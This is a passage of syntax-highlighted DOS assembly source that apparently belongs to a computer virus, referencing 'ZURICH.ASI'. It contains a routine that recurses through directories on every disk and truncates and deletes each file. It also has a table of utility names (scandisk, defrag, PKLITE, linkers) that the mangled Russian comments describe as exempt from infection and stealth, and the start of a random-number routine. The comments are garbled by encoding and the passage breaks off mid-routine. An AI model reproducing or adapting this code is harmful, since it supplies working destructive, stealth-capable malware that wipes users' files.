        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'.*'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'*'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FindFirst</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EndOfSearch</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
</span><span class="sc5">FindNext</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">
</span><span class="sc5">EndOfSearch</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ah</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
                </span><span class="sc5">DO</span><span class="sc0">
                    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">                </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DTADELTA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">forDTAs</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">FindNext</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">disk</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_disk</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">find_buf_pname</span><span class="sc0">
            </span><span class="sc5">DO</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.find_buf_attr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@0</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.find_buf_pname</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@1</span><span class="sc0">
</span><span class="sc5">@@0</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">   </span><span class="sc1">;file -&gt; restore DI</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D21h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NC</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosTruncate</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosClose</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;drop DI  ;        ;¥á«¨ ¤¨à¥ªâ®à¨ï +name</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0">

</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">ZURICH.ASI</span><span class="sc0">
</span><span class="sc1">;INCLUDE CRC.ASI</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

</span><span class="sc1">;public get_crc_just_fname</span><span class="sc0">
</span><span class="sc1">;public get_own_name</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DosCall</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">calculate_crc5</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;¯®«ãç¨âì ä ©«­¥©¬ ¨§ áà¥¤ë â¥ªãé¥£® PSP</span><span class="sc0">
</span><span class="sc1">;proc ;return ds:dx =@ParamStr(0) {use cur PSP}</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;CRPROC get_own_name, 79FCh</span><span class="sc0">
</span><span class="sc1">;public get_own_name</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">get_own_name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;    mov     ah, 34h</span><span class="sc0">
</span><span class="sc1">;    call    DosCall ;BX-cur psp</span><span class="sc0">
</span><span class="sc1">;    mov     ds, es:[bx][0Fh] ;cur PSP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PDB_environ</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;cur envir</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;ds:dx - string,</span><span class="sc0">
</span><span class="sc1">;(dx:cx)ax-crc of UpCase(JustFileName)</span><span class="sc0">
</span><span class="sc1">;ZF=1, ¥á«¨ CRC íâ®£® ¨¬¥­¨ ¥áâì ¢ â ¡«¨æ¥</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;CRPROC get_crc_just_fname, 474Ah</span><span class="sc0">
</span><span class="sc1">;public get_crc_just_fname</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">get_crc_just_fname</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
    </span><span class="sc6">std</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc5">EXIT</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc5">EXIT</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calculate_CRC5</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nostlnames</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nostlnamescount</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasw</span><span class="sc0">
</span><span class="sc1">;cmp di, cx ;&lt;debug zf=0</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;¯à¨ à ¡®â¥ íâ¨å ä ©«®¢ ¢ëª«îç ¥âáï áâ¥«âá</span><span class="sc0">
</span><span class="sc1">;¨ ¥é¥: íâ¨ ä ©«ë ­¥ § à ¦ îâáï!</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">nostlnames</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'U'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'U'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'N'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'C'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;uuencode</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'K'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'L'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'T'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;PKLITE</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'L'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'X'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;lzexe</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'N'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;ndd.exe</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'T'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;diet.</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'C'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'N'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;scandisk</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'X'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;sd.exe</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;speedisk</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'F'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'R'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;defrag</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'T'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'L'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'N'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'K'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;tlink</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'W'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'L'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'N'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'K'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;Wlink</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'L'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'N'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'K'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;link.exe</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'1'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;DPMI16</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'3'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;DPMI32</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'R'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'T'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;RTM.EXE</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0">  </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc12">'R'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'T'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'3'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'2'</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;RTM32.EXE</span><span class="sc0">
</span><span class="sc5">nostlnamescount</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">nostlnames</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">zurich.asi</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc1">;extrn begin_rnd_procs:dword</span><span class="sc0">
</span><span class="sc1">;extrn carrier   :near</span><span class="sc0">
</span><span class="sc1">;extrn end_msg   :near</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">r_lo</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">r_hi</span><span class="sc0">
</span><span class="sc1">;.model tiny</span><span class="sc0">
</span><span class="sc1">;.code</span><span class="sc0">

</span><span class="sc1">;10DCD</span><span class="sc0">
</span><span class="sc1">;      r_hi r_lo</span><span class="sc0">
</span><span class="sc1">;-------------------</span><span class="sc0">
</span><span class="sc1">;      xxxx xxxx    r_lo * 0DCDh</span><span class="sc0">
</span><span class="sc1">; yyyy yyyy         r_hi * 0DCDh</span><span class="sc0">
</span><span class="sc1">; r_hi r_lo              * 1</span><span class="sc0">
</span><span class="sc1">;-------------------</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">RND_GET</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">r_lo</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCDh</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111h</span><span class="sc0">
